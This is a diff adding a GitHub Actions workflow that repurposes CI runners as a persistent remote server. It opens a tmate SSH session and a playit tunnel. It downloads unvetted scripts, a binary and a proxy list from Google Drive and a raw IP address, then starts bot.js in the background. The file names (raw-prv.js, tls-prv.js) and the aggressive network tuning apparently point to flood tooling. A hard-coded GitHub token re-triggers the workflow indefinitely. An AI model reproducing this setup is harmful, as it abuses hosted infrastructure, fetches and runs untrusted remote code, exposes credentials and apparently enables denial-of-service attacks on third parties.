@@ -1,0 +1,89 @@
+name: Create VPS (Auto Restart)
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [create-vps]
+
+jobs:
+  start-vps:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360 # 6 hours
+    env:
+      TMATE_SERVER: nyc1.tmate.io
+
+    steps:
+      - name: " Checkout"
+        uses: actions/checkout@v3
+
+      - name: " Prepare dirs"
+        run: mkdir -p links .backup
+
+      - name: " Restore backup (optional)"
+        run: |
+          name="${{ github.event.client_payload.vps_name }}"
+          [ -z "$name" ] && name="manual-vps"
+          if [ "${{ github.event.client_payload.backup }}" == "true" ]; then
+            unzip ".backup/$name.zip" -d . || echo "?? No backup found."
+          fi
+
+      - name: " Start tmate session"
+        run: |
+          sudo apt update -y && sudo apt install -y tmate
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
+          name="${{ github.event.client_payload.vps_name }}"
+          [ -z "$name" ] && name="manual-vps"
+          echo "$SSH" | tee "links/$name.txt"
+
+      - name: " Start Playit Tunnel"
+        run: |
+          wget -q https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64 -O playit
+          chmod +x playit
+          nohup ./playit > playit.log 2>&1 &
+          echo "? Playit started in background."
+
+      - name: " Setup VPS"
+        run: |
+          pip install gdown      
+          npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator
+          sudo sysctl -w net.core.rmem_max=268435456 net.core.wmem_max=268435456 net.ipv4.tcp_rmem="4096 87380 268435456" net.ipv4.tcp_wmem="4096 65536 268435456" net.core.netdev_max_backlog=100000 net.ipv4.tcp_congestion_control=bbr net.ipv4.tcp_slow_start_after_idle=0 fs.file-max=2097152 kernel.pid_max=4194304 vm.max_map_count=1048576
+          gdown https://drive.google.com/uc?id=1SWyy812icKt6MaB-xMZKS24mpVNntgB6 -O raw-prv.js
+          gdown https://drive.google.com/uc?id=1P2Jzt1hMo4X2NZy0F3HnlZEp-rxtaAqU -O tls-prv.js    
+          gdown https://drive.google.com/uc?id=1Bw29iCwIwRAJloZZEDG_Kbe9cxNojaU7 -O fjium-hex
+          chmod +x fjium-hex
+          wget http://36.50.134.20:3000/download/http.txt 
+          sudo su
+          gdown https://drive.google.com/uc?id=1ieeUuvVvgJG1kU5MCGAKXSdeC6U4gAFM   
+          nohup node bot.js > bot.log 2>&1 &
+          echo " Bot started in background."
+
+      - name: " Save backup"
+        run: |
+          name="${{ github.event.client_payload.vps_name }}"
+          [ -z "$name" ] && name="manual-vps"
+          zip -qr ".backup/$name.zip" . -x ".git/*" ".github/*" ".backup/*" || true
+
+      - name: " Push updated files"
+        uses: stefanzweifel/git-auto-commit-action@v5
+        with:
+          commit_message: "?? Updated SSH + backup"
+          file_pattern: 'links/*.txt .backup/*.zip'
+
+      - name: " Keep VPS alive"
+        run: |
+          for i in $(seq 1 360); do
+            echo "?? Running minute $i/360..."
+            sleep 60
+          done
+
+      - name: " Restart workflow"
+        if: always()
+        run: |
+          curl -X POST \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer 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" \
+            -H "Content-Type: application/json" \
+            https://api.github.com/repos/${{ github.repository }}/dispatches \
+            -d '{"event_type": "create-vps", "client_payload": {"vps_name": "manual-vps", "backup": true}}'
